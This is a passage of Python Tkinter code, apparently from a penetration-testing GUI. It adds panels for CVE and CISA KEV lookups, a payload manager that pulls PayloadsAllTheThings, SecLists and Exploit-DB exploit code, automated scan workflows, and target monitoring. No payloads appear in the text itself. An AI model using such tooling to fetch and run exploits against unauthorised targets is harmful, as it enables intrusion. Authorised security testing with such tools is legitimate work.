        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "LATEST CRITICAL CVEs (Last 7 Days)", "📊").pack(fill='x', pady=(0,8))
        br = mk_frame(pad, bg=BG2); br.pack(fill='x', pady=(0,8))
        mk_btn(br, "🔄 Load Latest Critical", self._load_latest_cves, RED, small=True).pack(side='left', padx=4)
        self._lcve_days = tk.StringVar(value="7")
        ttk.Combobox(br, textvariable=self._lcve_days,
                     values=["1","7","14","30"], width=6, font=MONO_S).pack(side='left', padx=4)
        tk.Label(br, text="days", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._lcve_stat = tk.Label(br, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._lcve_stat.pack(side='left', padx=12)

        cols = ('CVE ID','Score','Severity','Published','KEV?','Description')
        self._lcve_tree = mk_tree(pad, columns=cols, show='headings', height=26)
        wsz = {'CVE ID':120,'Score':60,'Severity':80,'Published':90,'KEV?':55,'Description':400}
        for c in cols:
            self._lcve_tree.heading(c, text=c, anchor='w')
            self._lcve_tree.column(c, width=wsz.get(c,100), anchor='w')
        for sev in ('CRITICAL','HIGH','MEDIUM','LOW'):
            self._lcve_tree.tag_configure(sev, foreground=SEV_COLOR(sev), background=SEV_BG(sev))
        self._lcve_tree.tag_configure('KEV', foreground='#ff1744', background='#1a0005')
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._lcve_tree.yview)
        self._lcve_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._lcve_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        self._lcve_tree.bind('<Double-1>', lambda e: webbrowser.open(
            f"https://nvd.nist.gov/vuln/detail/{self._lcve_tree.item(self._lcve_tree.selection()[0])['values'][0]}"
            if self._lcve_tree.selection() else ""))

    def _load_latest_cves(self):
        try: days = int(self._lcve_days.get())
        except: days = 7
        self._lcve_stat.config(text="Loading from NVD...", fg=CYAN)
        self._lcve_tree.delete(*self._lcve_tree.get_children())
        def _go():
            cves = get_recent_cves(days=days, severity="CRITICAL", per_page=50)
            cves2 = cves.get("cves",[])
            kev_data = fetch_cisa_kev()
            kev_ids  = {v.get("cveID","") for v in kev_data.get("vulnerabilities",[])}
            def _upd():
                for cve in cves2:
                    in_kev = cve["id"] in kev_ids
                    tag    = "KEV" if in_kev else cve.get("severity","LOW")
                    self._lcve_tree.insert('','end', values=(
                        cve["id"], cve.get("score","N/A"), cve.get("severity","N/A"),
                        cve.get("published",""),
                        "🚨KEV" if in_kev else "no",
                        cve.get("description","")[:80]), tags=(tag,))
                err = cves.get("error","")
                if err:
                    self._lcve_stat.config(text=f"NVD error: {err} — retry in 6s", fg=RED)
                else:
                    self._lcve_stat.config(
                        text=f"Latest CRITICAL: {len(cves2)}  |  In KEV: {sum(1 for c in cves2 if c['id'] in kev_ids)}",
                        fg=RED if cves2 else YELLOW)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_full_intel_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "FULL VULNERABILITY INTEL (NVD + KEV + ExploitDB)", "🔗").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Technology/CVE:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._fi_query = tk.StringVar()
        se = mk_entry(tr, var=self._fi_query, w=36); se.pack(side='left', padx=8, ipady=3)
        se.bind('<Return>', lambda e: self._fi_search())
        mk_btn(tr, "🔗 Full Intel Search", self._fi_search, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(tr, "← My Target", lambda: self._fi_query.set(self.project.get().split('.')[0]), FG3, small=True).pack(side='left', padx=4)
        self._fi_txt = mk_stext(pad, h=30, bg=BG3, fg=FG)
        self._fi_txt.pack(fill='both', expand=True, pady=(8,0))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(4,0))
        mk_btn(bf, "📋 Copy Report", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._fi_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save Report", lambda: self._save_text(self._fi_txt.get('1.0','end')), GREEN, small=True).pack(side='left', padx=4)

    def _fi_search(self):
        q = self._fi_query.get().strip()
        if not q: return
        self._fi_txt.config(state='normal')
        self._fi_txt.delete('1.0','end')
        self._fi_txt.insert('end', f"[*] Full intel search for: {q}\n[*] Querying NVD + CISA KEV + Exploit-DB...\n\n")
        self._fi_txt.config(state='disabled')
        def _go():
            r = full_vuln_intel(q)
            def _upd():
                self._fi_txt.config(state='normal')
                self._fi_txt.delete('1.0','end')
                s = r.get("summary",{})
                self._fi_txt.insert('end', f"VULNERABILITY INTELLIGENCE REPORT\n{'='*60}\n")
                self._fi_txt.insert('end', f"Query:            {q}\n")
                self._fi_txt.insert('end', f"NVD Results:      {s.get('nvd_total',0)}\n")
                self._fi_txt.insert('end', f"CISA KEV matches: {s.get('kev_matches',0)}\n")
                self._fi_txt.insert('end', f"ExploitDB:        {s.get('edb_exploits',0)} public exploits\n")
                self._fi_txt.insert('end', f"Risk Level:       {s.get('risk_level','UNKNOWN')}\n\n")
                if s.get('kev_matches',0) > 0:
                    self._fi_txt.insert('end', "[!!! CRITICAL] Actively exploited in the wild (CISA KEV)\n\n")
                if s.get('has_public_exploit'):
                    self._fi_txt.insert('end', "[!!! HIGH] Public exploits available on Exploit-DB\n\n")
                # CVE details
                nvd_cves = r.get("nvd",{}).get("cves",[])
                if nvd_cves:
                    self._fi_txt.insert('end', f"\nTOP CVEs ({len(nvd_cves)}):\n{'-'*50}\n")
                    for cve in nvd_cves[:10]:
                        kev_mark = " [KEV]" if cve.get('in_kev') else ""
                        edb_mark = " [EXPLOIT]" if cve.get('has_exploit') else ""
                        self._fi_txt.insert('end',
                            f"  {cve['id']} — CVSS {cve.get('score','?')} [{cve.get('severity','?')}]{kev_mark}{edb_mark}\n")
                        self._fi_txt.insert('end', f"  {cve.get('description','')[:120]}\n\n")
                # KEV
                kev_res = r.get("kev",{}).get("results",[])
                if kev_res:
                    self._fi_txt.insert('end', f"\nCISA KEV ENTRIES ({len(kev_res)}):\n{'-'*50}\n")
                    for k in kev_res[:5]:
                        self._fi_txt.insert('end', f"  {k['cve_id']} — {k['vendor']} {k['product']}\n")
                        self._fi_txt.insert('end', f"  Due: {k['due_date']}  {k['short_desc'][:100]}\n\n")
                # Exploits
                exploits = r.get("edb",{}).get("exploits",[])
                if exploits:
                    self._fi_txt.insert('end', f"\nEXPLOIT-DB ({len(exploits)}):\n{'-'*50}\n")
                    for e in exploits[:5]:
                        self._fi_txt.insert('end', f"  EDB-{e['id']} [{e['type']}] {e['title'][:60]}\n")
                        self._fi_txt.insert('end', f"  {e['url']}\n\n")
                self._fi_txt.config(state='disabled')
                self.set_status(f"Intel: {s.get('nvd_total',0)} CVEs, {s.get('kev_matches',0)} KEV, {s.get('edb_exploits',0)} exploits", RED if s.get('kev_matches',0) > 0 else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    # ════════════════════════════════════════════════════════════════
    #  PAYLOAD MANAGER — PATT + SECLISTS + EXPLOITDB
    # ════════════════════════════════════════════════════════════════
    def _build_payload_mgr(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  📝 PATT Payloads  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  📂 SecLists  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  💥 EDB Payloads  ")
        self._build_patt_tab(f1)
        self._build_seclists_tab(f2)
        self._build_edb_payloads_tab(f3)

    def _build_patt_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "PAYLOADS ALL THE THINGS", "📝").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text="  Fetch latest payloads directly from PayloadsAllTheThings GitHub\n"
                 "  Always up-to-date, 20+ categories, cached locally for offline use",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=8)
        # Category selector
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Category:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._patt_cat = tk.StringVar(value="XSS")
        ttk.Combobox(tr, textvariable=self._patt_cat, values=PATT_CATEGORIES, width=26, font=MONO_S).pack(side='left', padx=8)
        mk_btn(tr, "📥 Fetch Payloads", self._patt_fetch, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(tr, "📥 Fetch All", self._patt_fetch_all, CYAN, small=True).pack(side='left', padx=4)
        self._patt_stat = tk.Label(pad, text="Select category and click Fetch", bg=BG2, fg=FG3, font=MONO_S)
        self._patt_stat.pack(anchor='w', pady=(0,4))
        # Payload list
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)
        left = mk_frame(paned, bg=BG2); paned.add(left, width=120)
        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        # Category quick-select
        self._patt_cat_list = tk.Listbox(left, bg=BG3, fg=FG2, font=MONO_T,
                                          selectbackground=BG5, selectforeground=ACCENT,
                                          relief='flat', bd=0)
        for cat in PATT_CATEGORIES:
            self._patt_cat_list.insert('end', cat)
        vsb_l = ttk.Scrollbar(left, orient='vertical', command=self._patt_cat_list.yview)
        self._patt_cat_list.configure(yscrollcommand=vsb_l.set)
        self._patt_cat_list.pack(side='left', fill='both', expand=True)
        vsb_l.pack(side='right', fill='y')
        self._patt_cat_list.bind('<Double-1>', lambda e: (
            self._patt_cat.set(self._patt_cat_list.get(self._patt_cat_list.curselection()[0])),
            self._patt_fetch()) if self._patt_cat_list.curselection() else None)
        self._patt_txt = mk_stext(right, h=24, bg=BG3, fg=GREEN)
        self._patt_txt.pack(fill='both', expand=True)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(4,0))
        mk_btn(bf, "📋 Copy All", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._patt_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save to Wordlists", self._patt_save, GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🌐 Open GitHub", lambda: webbrowser.open("https://github.com/swisskyrepo/PayloadsAllTheThings"), FG2, small=True).pack(side='left', padx=4)

    def _patt_fetch(self):
        cat = self._patt_cat.get()
        self._patt_stat.config(text=f"Fetching {cat}...", fg=CYAN)
        self._patt_txt.config(state='normal'); self._patt_txt.delete('1.0','end')
        self._patt_txt.insert('end', f"Fetching {cat} from PayloadsAllTheThings...\n")
        self._patt_txt.config(state='disabled')
        def _go():
            r = fetch_patt_payloads(cat)
            def _upd():
                self._patt_txt.config(state='normal')
                self._patt_txt.delete('1.0','end')
                if "error" in r:
                    self._patt_txt.insert('end', f"Error: {r['error']}\n")
                    self._patt_stat.config(text=f"Error: {r['error']}", fg=RED)
                else:
                    for p in r.get("payloads",[]):
                        self._patt_txt.insert('end', p+'\n')
                    self._patt_stat.config(
                        text=f"{r['category']}: {r['count']} payloads  |  Source: {r['source']}",
                        fg=GREEN)
                    self.set_status(f"PATT {cat}: {r['count']} payloads", GREEN)
                self._patt_txt.config(state='disabled')
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _patt_fetch_all(self):
        self._patt_stat.config(text="Fetching all categories (this may take a minute)...", fg=CYAN)
        def _go():
            all_payloads = {}
            for cat in PATT_CATEGORIES:
                try:
                    r = fetch_patt_payloads(cat)
                    all_payloads[cat] = r.get("payloads",[])
                except Exception:
                    pass
            def _upd():
                self._patt_txt.config(state='normal')
                self._patt_txt.delete('1.0','end')
                total = 0
                for cat, payloads in all_payloads.items():
                    self._patt_txt.insert('end', f"\n# {cat} ({len(payloads)} payloads)\n")
                    for p in payloads[:20]:
                        self._patt_txt.insert('end', p+'\n')
                    total += len(payloads)
                self._patt_txt.config(state='disabled')
                self._patt_stat.config(text=f"All categories: {total} payloads from {len(all_payloads)} categories", fg=GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _patt_save(self):
        cat  = self._patt_cat.get().replace(' ','_').lower()
        text = self._patt_txt.get('1.0','end').strip()
        if not text: return
        from utils.wordlist import save_custom_wordlist
        path = save_custom_wordlist(f"patt_{cat}", text)
        self.set_status(f"Saved to: {path}", GREEN)

    def _build_seclists_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "SECLISTS WORDLIST MANAGER", "📂").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text="  Download any SecLists wordlist directly to your project\n"
                 "  22+ categories — directories, subdomains, params, XSS, SQLi, passwords, fuzzing",
                 bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=10, pady=8)
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Wordlist:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._sl_name = tk.StringVar(value="directories_small")
        ttk.Combobox(tr, textvariable=self._sl_name, values=WORDLIST_NAMES, width=28, font=MONO_S).pack(side='left', padx=8)
        tk.Label(tr, text="Limit:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._sl_limit = tk.StringVar(value="0")
        ttk.Combobox(tr, textvariable=self._sl_limit,
                     values=["0","100","500","1000","5000","10000"], width=7, font=MONO_S).pack(side='left')
        tk.Label(tr, text="(0=all)", bg=BG2, fg=FG3, font=MONO_T).pack(side='left', padx=4)
        mk_btn(tr, "📥 Fetch", self._sl_fetch, ACCENT, small=True).pack(side='left', padx=8)
        mk_btn(tr, "💾 Save to Project", self._sl_save, GREEN, small=True).pack(side='left', padx=4)
        self._sl_stat = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._sl_stat.pack(anchor='w', pady=(0,4))
        self._sl_txt = mk_stext(pad, h=26, bg=BG3, fg=FG)
        self._sl_txt.pack(fill='both', expand=True)
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(4,0))
        mk_btn(bf, "📋 Copy All", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._sl_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🌐 Browse SecLists", lambda: webbrowser.open("https://github.com/danielmiessler/SecLists"), FG2, small=True).pack(side='left', padx=4)

    def _sl_fetch(self):
        name = self._sl_name.get()
        try: limit = int(self._sl_limit.get())
        except: limit = 0
        self._sl_stat.config(text=f"Fetching {name}...", fg=CYAN)
        self._sl_txt.config(state='normal'); self._sl_txt.delete('1.0','end')
        self._sl_txt.insert('end', f"Fetching {name} from SecLists...\n")
        self._sl_txt.config(state='disabled')
        def _go():
            r = fetch_wordlist(name, lines_limit=limit)
            def _upd():
                self._sl_txt.config(state='normal')
                self._sl_txt.delete('1.0','end')
                if "error" in r:
                    self._sl_txt.insert('end', f"Error: {r['error']}\n")
                    if r.get("fallback_url"):
                        self._sl_txt.insert('end', f"Download manually: {r['fallback_url']}\n")
                    self._sl_stat.config(text=f"Error: {r['error']}", fg=RED)
                else:
                    for w in r.get("words",[]):
                        self._sl_txt.insert('end', w+'\n')
                    self._sl_stat.config(
                        text=f"{name}: {r['count']} words  |  Source: {r['source']}",
                        fg=GREEN)
                    self.set_status(f"SecLists {name}: {r['count']} words", GREEN)
                self._sl_txt.config(state='disabled')
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _sl_save(self):
        name = self._sl_name.get()
        text = self._sl_txt.get('1.0','end').strip()
        if not text: return
        from utils.wordlist import save_custom_wordlist
        path = save_custom_wordlist(name, text)
        self.set_status(f"Saved: {path}", GREEN)

    def _build_edb_payloads_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "EXPLOIT-DB PAYLOAD EXTRACTOR", "💥").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="CVE / Tech / Vuln:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._edb_pay_q = tk.StringVar()
        mk_entry(tr, var=self._edb_pay_q, w=34).pack(side='left', padx=8, ipady=3)
        self._edb_extract_code = tk.BooleanVar(value=True)
        ttk.Checkbutton(tr, text="Extract Code", variable=self._edb_extract_code).pack(side='left', padx=4)
        mk_btn(tr, "💥 Fetch Exploits", self._edb_pay_fetch, RED, small=True).pack(side='left', padx=8)
        self._edb_pay_txt = mk_stext(pad, h=28, bg=BG3, fg=FG)
        self._edb_pay_txt.pack(fill='both', expand=True, pady=(8,0))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(4,0))
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._edb_pay_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", lambda: self._save_text(self._edb_pay_txt.get('1.0','end')), GREEN, small=True).pack(side='left', padx=4)

    def _edb_pay_fetch(self):
        q = self._edb_pay_q.get().strip()
        if not q: return
        self._edb_pay_txt.config(state='normal')
        self._edb_pay_txt.delete('1.0','end')
        self._edb_pay_txt.insert('end', f"[*] Fetching exploits for: {q}\n")
        self._edb_pay_txt.config(state='disabled')
        extract = self._edb_extract_code.get()
        def _go():
            r = get_exploit_payloads(q, extract_code=extract)
            exploits = r.get("exploits", [])
            def _upd():
                self._edb_pay_txt.config(state='normal')
                self._edb_pay_txt.delete('1.0','end')
                if not exploits:
                    err = r.get("error","")
                    fb  = r.get("fallback","")
                    self._edb_pay_txt.insert('end', f"No exploits found for '{q}'\n")
                    if err: self._edb_pay_txt.insert('end', f"Error: {err}\n")
                    if fb:
                        self._edb_pay_txt.insert('end', f"\nOpen in browser: {fb}\n")
                        webbrowser.open(fb)
                else:
                    self._edb_pay_txt.insert('end', f"Found {len(exploits)} exploits for '{q}'\n{'='*60}\n\n")
                    for e in exploits:
                        self._edb_pay_txt.insert('end', f"[EDB-{e['id']}] {e['title']}\n")
                        self._edb_pay_txt.insert('end', f"Date: {e['date']}  Type: {e['type']}  Platform: {e['platform']}\n")
                        self._edb_pay_txt.insert('end', f"URL: {e['url']}\n")
                        if e.get('code'):
                            self._edb_pay_txt.insert('end', f"\n--- CODE ---\n{e['code'][:1000]}\n{'─'*40}\n")
                        self._edb_pay_txt.insert('end', "\n")
                    self.set_status(f"EDB: {len(exploits)} exploits for '{q}'", GREEN)
                self._edb_pay_txt.config(state='disabled')
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()



    # ═══════════════════════════════════════════════════════════════
    #  TIER 2 — AUTOMATION WORKFLOWS
    # ═══════════════════════════════════════════════════════════════
    def _build_workflows(self, frame):
        frame.configure(bg=BG2)
        paned = tk.PanedWindow(frame, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)

        # Left — workflow list
        left = mk_frame(paned, bg=BG2); paned.add(left, width=260)
        tk.Label(left, text="WORKFLOWS", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(10,4), padx=12, anchor='w')
        self._wf_listbox = tk.Listbox(left, bg=BG3, fg=FG, font=MONO_S,
            selectbackground=BG5, selectforeground=ACCENT,
            relief='flat', bd=0, height=22)
        vsb = ttk.Scrollbar(left, orient='vertical', command=self._wf_listbox.yview)
        self._wf_listbox.configure(yscrollcommand=vsb.set)
        self._wf_listbox.pack(side='left', fill='both', expand=True, padx=(12,0), pady=(0,6))
        vsb.pack(side='right', fill='y', pady=(0,6))
        self._wf_listbox.bind('<<ListboxSelect>>', self._wf_on_select)

        bf_l = mk_frame(left, bg=BG2); bf_l.pack(fill='x', padx=12, pady=(0,8))
        mk_btn(bf_l, "🔄 Refresh", self._wf_load_list, FG3, small=True).pack(side='left', padx=2)
        mk_btn(bf_l, "🗑 Delete",  self._wf_delete,     RED,  small=True).pack(side='left', padx=2)

        # Right — detail + run
        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')

        # Target + run controls
        top_r = mk_frame(right, bg=BG2); top_r.pack(fill='x', padx=12, pady=(10,6))
        mk_section(top_r, "AUTOMATION WORKFLOWS", "🔄").pack(fill='x', pady=(0,8))
        tr = mk_frame(right, bg=BG2); tr.pack(fill='x', padx=12, pady=(0,8))
        tk.Label(tr, text="Target:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._wf_target = tk.StringVar(value=self.project.get() or "")
        mk_entry(tr, var=self._wf_target, w=38).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: self._wf_target.set(self.project.get()), FG3, small=True).pack(side='left')

        bf_r = mk_frame(right, bg=BG2); bf_r.pack(fill='x', padx=12, pady=(0,8))
        self._wf_run_btn  = mk_btn(bf_r, "▶ RUN WORKFLOW",  self._wf_run,   GREEN)
        self._wf_run_btn.pack(side='left', ipady=6, padx=(0,8))
        self._wf_stop_btn = mk_btn(bf_r, "■ STOP",          self._wf_stop,  RED)
        self._wf_stop_btn.pack(side='left', ipady=6)
        self._wf_status = tk.Label(bf_r, text="Select a workflow", bg=BG2, fg=FG3, font=MONO_S)
        self._wf_status.pack(side='left', padx=12)

        # Workflow description
        self._wf_desc_card = mk_card(right)
        self._wf_desc_card.pack(fill='x', padx=12, pady=(0,8))
        self._wf_desc_lbl = tk.Label(self._wf_desc_card, text="",
            bg=BG3, fg=FG2, font=MONO_S, justify='left', wraplength=600)
        self._wf_desc_lbl.pack(anchor='w', padx=12, pady=8)

        # Steps preview
        tk.Label(right, text="Steps:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', padx=12, pady=(0,4))
        self._wf_steps_txt = mk_stext(right, h=6, bg=BG3, fg=CYAN)
        self._wf_steps_txt.pack(fill='x', padx=12, pady=(0,8))

        # Terminal output
        tk.Label(right, text="Output:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', padx=12)
        self._wf_term = Terminal(right, height=14, title="WORKFLOW ENGINE")
        self._wf_term.pack(fill='both', expand=True, padx=12, pady=(4,12))

        # Custom workflow builder
        custom_card = mk_card(right)
        custom_card.pack(fill='x', padx=12, pady=(0,12))
        tk.Label(custom_card, text="  + Create Custom Workflow", bg=BG3, fg=ACCENT, font=MONO_B).pack(anchor='w', padx=10, pady=(8,4))
        cr = mk_frame(custom_card, bg=BG3); cr.pack(fill='x', padx=12, pady=(0,8))
        self._wf_new_name = tk.StringVar()
        tk.Label(cr, text="Name:", bg=BG3, fg=FG3, font=MONO_S).pack(side='left')
        mk_entry(cr, var=self._wf_new_name, w=24).pack(side='left', padx=8, ipady=3)
        mk_btn(cr, "📂 Import JSON", self._wf_import, CYAN, small=True).pack(side='left', padx=4)
        mk_btn(cr, "💾 Save Current", self._wf_save, GREEN, small=True).pack(side='left', padx=4)

        self._wf_thread   = None
        self._wf_selected = None
        self._wf_load_list()

    def _wf_load_list(self):
        self._wf_listbox.delete(0, 'end')
        for name in list_workflows().keys():
            self._wf_listbox.insert('end', name)

    def _wf_on_select(self, _e=None):
        sel = self._wf_listbox.curselection()
        if not sel: return
        name = self._wf_listbox.get(sel[0])
        self._wf_selected = name
        wf = list_workflows().get(name, {})
        self._wf_desc_lbl.config(text=wf.get("description","No description"))
        self._wf_steps_txt.config(state='normal'); self._wf_steps_txt.delete('1.0','end')
        for i, step in enumerate(wf.get("steps",[]), 1):
            cmd_str = ' '.join(step.get("cmd",[]))[:80]
            self._wf_steps_txt.insert('end', f"  [{i}] {step['name']}: {cmd_str}\n")
        self._wf_steps_txt.config(state='disabled')
        self._wf_status.config(text=f"Selected: {name}", fg=ACCENT)

    def _wf_run(self):
        if not self._wf_selected:
            messagebox.showwarning("No Workflow", "Select a workflow first.", parent=self.root); return
        target = self._wf_target.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Enter a target domain.", parent=self.root); return
        target = target.replace("https://","").replace("http://","").split("/")[0]
        out_dir = LOGS_DIR / target / "workflows"
        out_dir.mkdir(parents=True, exist_ok=True)
        self._wf_run_btn.config(state='disabled')
        self._wf_status.config(text=f"Running: {self._wf_selected}...", fg=CYAN)
        def log_cb(text, tag='normal'):  self._wf_term.log(text, tag)
        def done_cb(name, tgt):
            self.root.after(0, lambda: (
                self._wf_run_btn.config(state='normal'),
                self._wf_status.config(text=f"Done: {name}", fg=GREEN),
                self.set_status(f"Workflow '{name}' complete", GREEN)
            ))
        self._wf_thread = run_workflow(self._wf_selected, target, out_dir,
                                        log_cb=log_cb, done_cb=done_cb)

    def _wf_stop(self):
        if self._wf_thread and self._wf_thread.is_alive():
            self._wf_status.config(text="Stopping...", fg=YELLOW)
        self._wf_run_btn.config(state='normal')

    def _wf_import(self):
        path = filedialog.askopenfilename(filetypes=[("JSON","*.json"),("All","*.*")])
        if not path: return
        try:
            wf = json.loads(Path(path).read_text())
            from modules.advanced.tools import WORKFLOW_SAVE_DIR
            import shutil as _sh
            _sh.copy(path, str(WORKFLOW_SAVE_DIR / Path(path).name))
            self._wf_load_list()
            self.set_status(f"Workflow imported: {Path(path).name}", GREEN)
        except Exception as e:
            messagebox.showerror("Error", str(e), parent=self.root)

    def _wf_save(self):
        name = self._wf_new_name.get().strip()
        if not name: return
        steps_txt = self._wf_steps_txt.get('1.0','end').strip()
        from modules.advanced.tools import save_custom_workflow
        path = save_custom_workflow(name, [], steps_txt)
        self._wf_load_list(); self.set_status(f"Saved: {path}", GREEN)

    def _wf_delete(self):
        sel = self._wf_listbox.curselection()
        if not sel: return
        name = self._wf_listbox.get(sel[0])
        from modules.advanced.tools import WORKFLOW_SAVE_DIR
        path = WORKFLOW_SAVE_DIR / f"{name.replace(' ','_')}.json"
        if path.exists() and messagebox.askyesno("Delete", f"Delete '{name}'?", parent=self.root):
            path.unlink(); self._wf_load_list()

    # ═══════════════════════════════════════════════════════════════
    #  TIER 2 — LIVE TARGET MONITOR
    # ═══════════════════════════════════════════════════════════════
    def _build_monitor(self, frame):
        frame.configure(bg=BG2)
        paned = tk.PanedWindow(frame, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)

        # Left — targets list
        left = mk_frame(paned, bg=BG2); paned.add(left, width=280)
        tk.Label(left, text="MONITORED TARGETS", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(10,4), padx=12, anchor='w')

        self._mon_tree = mk_tree(left, columns=('Target','Status','Changes','Last'),
            show='headings', height=18)
        for c,w in [('Target',150),('Status',60),('Changes',60),('Last',80)]:
            self._mon_tree.heading(c, text=c); self._mon_tree.column(c, width=w)
        self._mon_tree.tag_configure('active',  foreground=GREEN, background=BG3)
        self._mon_tree.tag_configure('changed', foreground=RED, background=BG3)
        self._mon_tree.tag_configure('idle',    foreground=FG3, background=BG3)
        vsb = ttk.Scrollbar(left, orient='vertical', command=self._mon_tree.yview)
        self._mon_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(left, bg=BG2); tf.pack(fill='both', expand=True, padx=12, pady=(0,4))
        self._mon_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)
        bf_l = mk_frame(left, bg=BG2); bf_l.pack(fill='x', padx=12, pady=(0,8))
        mk_btn(bf_l, "🔄 Refresh", self._mon_load, FG3, small=True).pack(side='left', padx=2)
        mk_btn(bf_l, "🗑 Remove",  self._mon_remove, RED, small=True).pack(side='left', padx=2)

        # Right
        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        mk_section(right, "LIVE TARGET MONITOR", "📡").pack(fill='x', padx=12, pady=(10,8))

        info = mk_card(right); info.pack(fill='x', padx=12, pady=(0,8))
        tk.Label(info, text=(
            "  Continuously monitor targets for changes:\n"
            "  New subdomains  •  HTTP status changes  •  Tech stack changes  •  Content changes\n"
            "  Get alerts when new attack surface appears"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=10, pady=8)

        # Add target
        tr = mk_frame(right, bg=BG2); tr.pack(fill='x', padx=12, pady=(0,8))
        tk.Label(tr, text="Add Target:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._mon_new = tk.StringVar()
        mk_entry(tr, var=self._mon_new, w=32).pack(side='left', padx=8, ipady=3)
        tk.Label(tr, text="Interval (hrs):", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(8,4))
        self._mon_interval = tk.StringVar(value="24")
        ttk.Combobox(tr, textvariable=self._mon_interval, values=["1","6","12","24","48"], width=5, font=MONO_S).pack(side='left')
        mk_btn(tr, "+ Add", self._mon_add, GREEN, small=True).pack(side='left', padx=8)
        mk_btn(tr, "← Project", lambda: self._mon_new.set(self.project.get()), FG3, small=True).pack(side='left')

        # Run controls
        bf = mk_frame(right, bg=BG2); bf.pack(fill='x', padx=12, pady=(0,8))
        mk_btn(bf, "🔍 Check Selected Now", self._mon_check_now, ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🔍 Check All Now",       self._mon_check_all, CYAN,   small=True).pack(side='left', padx=4)
        mk_btn(bf, "📊 View Changes",        self._mon_view_changes, YELLOW, small=True).pack(side='left', padx=4)
